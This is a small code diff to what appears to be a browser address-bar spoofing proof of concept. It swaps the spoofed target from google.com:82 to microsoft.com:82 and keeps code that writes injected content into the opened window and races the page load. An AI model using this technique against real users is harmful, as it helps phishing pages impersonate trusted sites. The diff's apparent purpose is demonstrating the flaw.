@@ -15,13 +15,13 @@
         windowSpoof.location.href !== 'about:blank';
       }
       catch (e) {
-        windowSpoof.location.href='https://www.google.com:82';
+        windowSpoof.location.href='https://www.microsoft.com:82';
       }
     }
     
     function startSpoof() {
 
-      windowSpoof = window.open("https://www.google.com:82","x");
+      windowSpoof = window.open("https://www.microsoft.com:82","x");
       windowSpoof.document.write("<h2>Your address bar has been spoofed. This is not https://www.amazon.com/</h2>");
 
       setInterval('race()', 0);
